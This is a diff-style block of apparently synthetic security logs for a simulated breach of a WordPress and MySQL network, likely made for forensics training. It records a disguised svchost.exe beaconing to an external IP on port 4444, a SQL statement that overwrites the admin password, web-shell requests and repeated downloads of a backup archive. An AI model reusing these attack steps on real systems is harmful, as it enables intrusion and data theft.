+2025-06-10 11:00:25,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 11:00:26,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 11:00:27,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 11:00:28,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 11:00:29,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 11:00:30,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 11:00:31,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 11:00:32,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 11:00:33,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 11:00:34,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 11:00:35,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 11:00:36,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 11:00:37,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 11:00:38,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 11:00:39,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 11:00:40,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 11:00:41,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 11:00:42,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 11:00:43,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 11:00:44,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 11:00:45,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 11:00:46,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 11:00:47,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 11:00:48,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 11:00:49,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 11:00:50,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 11:00:51,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 11:00:52,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 11:00:53,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 11:00:54,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 11:00:55,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 11:00:56,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 11:00:57,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 11:00:58,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 11:00:59,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 11:01:00,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 12:00:00,172.16.10.30,DB-01,mysql,104,Connection: 127.0.0.1:3306,User: backup,Status: Connect
+2025-06-10 12:00:01,172.16.10.30,DB-01,mysql,100,SELECT * FROM customers,User: backup
+2025-06-10 12:00:02,172.16.10.30,DB-01,mysql,100,SELECT * FROM wp_users,User: backup
+2025-06-10 12:00:03,172.16.10.30,DB-01,mysql,100,UPDATE wp_users SET user_pass = MD5('newpassword') WHERE user_login = 'admin',User: backup
+2025-06-10 12:00:04,172.16.10.30,DB-01,mysql,104,Connection: 127.0.0.1:3306,User: backup,Status: Disconnect
+2025-06-10 13:00:00,172.16.10.20,WEB-01,nginx.access,194.34.132.15 - - [10/Jun/2025:13:00:00 +0000] "GET /wp-content/uploads/2025/06/shell.php HTTP/1.1" 200 5120 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 13:00:01,172.16.10.20,WEB-01,nginx.access,194.34.132.15 - - [10/Jun/2025:13:00:01 +0000] "POST /wp-content/uploads/2025/06/shell.php HTTP/1.1" 200 2048 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 13:00:02,172.16.10.20,WEB-01,nginx.access,194.34.132.15 - - [10/Jun/2025:13:00:02 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 13:00:03,172.16.10.20,WEB-01,nginx.access,194.34.132.15 - - [10/Jun/2025:13:00:03 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 13:00:04,172.16.10.20,WEB-01,nginx.access,194.34.132.15 - - [10/Jun/2025:13:00:04 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 13:00:05,172.16.10.20,WEB-01,nginx.access,194.34.132.15 - - [10/Jun/2025:13:00:05 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 13:00:06,172.16.10.20,WEB-01,nginx.access,194.34.132.15 - - [10/Jun/2025:13:00:06 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 13:00:07,172.16.10.20,WEB-01,nginx.access,194.34.132.15 - - [10/Jun/2025:13:00:07 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 13:00:08,172.16.10.20,WEB-01,nginx.access,194.34.132.15 - - [10/Jun/2025:13:00:08 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 13:00:09,172.16.10.20,WEB-01,nginx.access,194.34.132.15 - - [10/Jun/2025:13:00:09 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 13:00:10,172.16.10.20,WEB-01,nginx.access,194.34.132.15 - - [10/Jun/2025:13:00:10 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 13:00:11,172.16.10.20,WEB-01,nginx.access,194.34.132.15 - - [10/Jun/2025:13:00:11 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 13:00:12,172.16.10.20,WEB-01,nginx.access,194.34.132.15 - - [10/Jun/2025:13:00:12 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 13:00:13,172.16.10.20,WEB-01,nginx.access,194.34.132.15 - - [10/Jun/2025:13:00:13 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 13:00:14,172.16.10.20,WEB-01,nginx.access,194.34.132.15 - - [10/Jun/2025:13:00:14 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 13:00:15,172.16.10.20,WEB-01,nginx.access,194.34.132.15 - - [10/Jun/2025:13:00:15 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 13:00:16,172.16.10.20,WEB-01,nginx.access,194.34.132.15 - - [10/Jun/2025:13:00:16 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 13:00:17,172.16.10.20,WEB-01,nginx.access,194.34.132.15 - - [10/Jun/2025:13:00:17 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 13:00:18,172.16.10.20,WEB-01,nginx.access,194.34.132.15 - - [10/Jun/2025:13:00:18 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 13:00:19,172.16.10.20,WEB-01,nginx.access,194.34.132.15 - - [10/Jun/2025:13:00:19 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 13:00:20,172.16.10.20,WEB-01,nginx.access,194.34.132.15 - - [10/Jun/2025:13:00:20 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 13:00:21,172.16.10.20,WEB-01,nginx.access,194.34.132.15 - - [10/Jun/2025:13:00:21 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 13:00:22,172.16.10.20,WEB-01,nginx.access,194.34.132.15 - - [10/Jun/2025:13:00:22 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 13:00:23,172.16.10.20,WEB-01,nginx.access,194.34.132.15 - - [10/Jun/2025:13:00:23 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 13:00:24,172.16.10.20,WEB-01,nginx.access,194.34.132.15 - - [10/Jun/2025:13:00:24 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 13:00:25,172.16.10.20,WEB-01,nginx.access,194.34.132.15 - - [10/Jun/2025:13:00:25 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 13:00:26,172.16.10.20,WEB-01,nginx.access,194.34.132.15 - - [10/Jun/2025:13:00:26 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 13:00:27,172.16.10.20,WEB-01,nginx.access,194.34.132.15 - - [10/Jun/2025:13:00:27 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 13:00:28,172.16.10.20,WEB-01,nginx.access,194.34.132.15 - - [10/Jun/2025:13:00:28 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 13:00:29,172.16.10.20,WEB-01,nginx.access,194.34.132.15 - - [10/Jun/2025:13:00:29 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 13:00:30,172.16.10.20,WEB-01,nginx.access,194.34.132.15 - - [10/Jun/2025:13:00:30 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 13:00:31,172.16.10.20,WEB-01,nginx.access,194.34.132.15 - - [10/Jun/2025:13:00:31 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 13:00:32,172.16.10.20,WEB-01,nginx.access,194.34.132.15 - - [10/Jun/2025:13:00:32 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 13:00:33,172.16.10.20,WEB-01,nginx.access,194.34.132.15 - - [10/Jun/2025:13:00:33 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 13:00:34,172.16.10.20,WEB-01,nginx.access,194.34.132.15 - - [10/Jun/2025:13:00:34 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 13:00:35,172.16.10.20,WEB-01,nginx.access,194.34.132.15 - - [10/Jun/2025:13:00:35 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 13:00:36,172.16.10.20,WEB-01,nginx.access,194.34.132.15 - - [10/Jun/2025:13:00:36 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 13:00:37,172.16.10.20,WEB-01,nginx.access,194.34.132.15 - - [10/Jun/2025:13:00:37 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 13:00:38,172.16.10.20,WEB-01,nginx.access,194.34.132.15 - - [10/Jun/2025:13:00:38 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 13:00:39,172.16.10.20,WEB-01,nginx.access,194.34.132.15 - - [10/Jun/2025:13:00:39 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 13:00:40,172.16.10.20,WEB-01,nginx.access,194.34.132.15 - - [10/Jun/2025:13:00:40 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 13:00:41,172.16.10.20,WEB-01,nginx.access,194.34.132.15 - - [10/Jun/2025:13:00:41 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 13:00:42,172.16.10.20,WEB-01,nginx.access,194.34.132.15 - - [10/Jun/2025:13:00:42 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 13:00:43,172.16.10.20,WEB-01,nginx.access,194.34.132.15 - - [10/Jun/2025:13:00:43 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 13:00:44,172.16.10.20,WEB-01,nginx.access,194.34.132.15 - - [10/Jun/2025:13:00:44 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 13:00:45,172.16.10.20,WEB-01,nginx.access,194.34.132.15 - - [10/Jun/2025:13:00:45 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 13:00:46,172.16.10.20,WEB-01,nginx.access,194.34.132.15 - - [10/Jun/2025:13:00:46 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 13:00:47,172.16.10.20,WEB-01,nginx.access,194.34.132.15 - - [10/Jun/2025:13:00:47 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 13:00:48,172.16.10.20,WEB-01,nginx.access,194.34.132.15 - - [10/Jun/2025:13:00:48 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 13:00:49,172.16.10.20,WEB-01,nginx.access,194.34.132.15 - - [10/Jun/2025:13:00:49 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 13:00:50,172.16.10.20,WEB-01,nginx.access,194.34.132.15 - - [10/Jun/2025:13:00:50 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 17:00:00,192.168.1.100,DC-01,Security,4634,Logoff,User: maryam
+2025-06-10 17:01:00,192.168.1.110,FILE-01,Security,4634,Logoff,User: reza
+2025-06-10 17:02:00,192.168.1.120,PC-DEV-01,Security,4634,Logoff,User: saeed
+2025-06-10 17:03:00,192.168.1.130,PC-SALES-01,Security,4634,Logoff,User: ali
+2025-06-10 18:00:00,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:00:00 +0000] "GET /wp-admin/ HTTP/1.1" 200 5342 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:00:01,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:00:01 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 123 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:00:02,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:00:02 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:00:03,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:00:03 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:00:04,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:00:04 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:00:05,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:00:05 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:00:06,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:00:06 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:00:07,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:00:07 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:00:08,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:00:08 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:00:09,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:00:09 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:00:10,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:00:10 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:00:11,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:00:11 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:00:12,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:00:12 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:00:13,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:00:13 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:00:14,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:00:14 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:00:15,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:00:15 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:00:16,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:00:16 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:00:17,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:00:17 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:00:18,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:00:18 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:00:19,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:00:19 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:00:20,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:00:20 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 18:00:21,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:18:00:21 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
